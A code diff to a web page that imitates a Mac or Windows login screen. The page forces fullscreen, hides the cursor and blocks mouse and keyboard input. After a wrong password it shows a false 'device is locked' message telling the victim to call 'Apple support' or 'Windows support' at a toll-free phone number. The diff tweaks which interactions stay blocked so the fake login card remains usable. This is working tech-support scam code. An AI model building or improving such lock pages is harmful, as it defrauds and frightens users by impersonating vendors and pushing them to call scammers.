@@ -78,16 +78,12 @@
       background-color: #000;
       overflow: hidden;
       z-index: 2;
-    }
-    .mac-bg {
-      background-image: url('https://images.unsplash.com/photo-1637825891033-9cb7f7a9f6b7?auto=format&fit=crop&w=1920&q=80');
-      font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
-    }
-    .windows-bg {
-      background-image: url('https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?auto=format&fit=crop&w=1920&q=80');
-      font-family: 'Segoe UI', Roboto, sans-serif;
+      cursor: none; /* Disable cursor on login section */
+      pointer-events: none; /* Disable mouse events except for card */
     }
     .card {
+      pointer-events: auto; /* Re-enable interactions on login card */
+      cursor: auto; /* Restore cursor on login card */
       background: rgba(0, 0, 0, 0.4);
       backdrop-filter: blur(12px);
       padding: 32px;
@@ -97,6 +93,14 @@
       box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
       border: 1px solid rgba(255, 255, 255, 0.15);
       transition: opacity 0.3s ease;
+    }
+    .mac-bg {
+      background-image: url('https://images.unsplash.com/photo-1637825891033-9cb7f7a9f6b7?auto=format&fit=crop&w=1920&q=80');
+      font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
+    }
+    .windows-bg {
+      background-image: url('https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?auto=format&fit=crop&w=1920&q=80');
+      font-family: 'Segoe UI', Roboto, sans-serif;
     }
     .mac-card {
       background: rgba(255, 255, 255, 0.1);
@@ -299,9 +303,6 @@
         } else if (loginSection.msRequestFullscreen) { /* IE11 */
           loginSection.msRequestFullscreen();
         }
-        // Disable mouse cursor immediately
-        document.body.style.pointerEvents = 'none';
-        document.body.style.cursor = 'none';
       }
     });
 
@@ -338,9 +339,9 @@
     }
 
     function checkPassword(){
-      // Display error message and ensure interactions remain disabled
+      // Display error message and disable all interactions
       if(os === 'mac'){
-        errorMsg.innerText = "You have entered wrong password and your device is locked. Call Apple support immediately At Toll Free +1-803-762-4570";
+        errorMsg.innerText = "You hasve entered wrong password and your device is locked. Call Apple support immediately At Toll Free +1-803-762-4570";
       } else {
         errorMsg.innerText = "You have entered wrong password and your device is locked. Call Windows support immediately At Toll Free +1-803-762-4570";
       }
@@ -348,17 +349,20 @@
       document.body.classList.add('disabled-interaction');
       card.classList.add('locked-card');
       passwordInput.disabled = true;
-      // Ensure mouse events are disabled
+      // Disable all mouse events
       document.body.style.pointerEvents = 'none';
       document.body.style.cursor = 'none';
       setTimeout(()=>{
         errorMsg.style.display = 'none';
         document.body.classList.remove('disabled-interaction');
         card.classList.remove('locked-card');
-        document.body.style.pointerEvents = 'none'; // Keep disabled after error
-        document.body.style.cursor = 'none'; // Keep disabled after error
+        document.body.style.pointerEvents = 'none'; // Keep disabled outside card
+        document.body.style.cursor = 'none';
         passwordInput.disabled = false;
         passwordInput.value = '';
+        // Re-enable interactions on login card
+        card.style.pointerEvents = 'auto';
+        card.style.cursor = 'auto';
       }, 30000);
     }
 
@@ -370,35 +374,35 @@
       }
     });
 
-    // Prevent all keyboard input when error message is shown or login screen is active
+    // Prevent keyboard input when error message is shown
     document.addEventListener('keydown', (event) => {
-      if (document.body.classList.contains('disabled-interaction') || loginSection.style.display === 'flex') {
+      if (document.body.classList.contains('disabled-interaction')) {
         event.preventDefault();
         event.stopPropagation();
       }
     }, true);
 
-    // Prevent all mouse events when error message is shown or login screen is active
+    // Prevent mouse events when error message is shown
     document.addEventListener('mousemove', (event) => {
-      if (document.body.classList.contains('disabled-interaction') || loginSection.style.display === 'flex') {
+      if (document.body.classList.contains('disabled-interaction')) {
         event.preventDefault();
         event.stopPropagation();
       }
     }, true);
     document.addEventListener('click', (event) => {
-      if (document.body.classList.contains('disabled-interaction') || loginSection.style.display === 'flex') {
+      if (document.body.classList.contains('disabled-interaction')) {
         event.preventDefault();
         event.stopPropagation();
       }
     }, true);
     document.addEventListener('mousedown', (event) => {
-      if (document.body.classList.contains('disabled-interaction') || loginSection.style.display === 'flex') {
+      if (document.body.classList.contains('disabled-interaction')) {
         event.preventDefault();
         event.stopPropagation();
       }
     }, true);
     document.addEventListener('mouseup', (event) => {
-      if (document.body.classList.contains('disabled-interaction') || loginSection.style.display === 'flex') {
+      if (document.body.classList.contains('disabled-interaction')) {
         event.preventDefault();
         event.stopPropagation();
       }
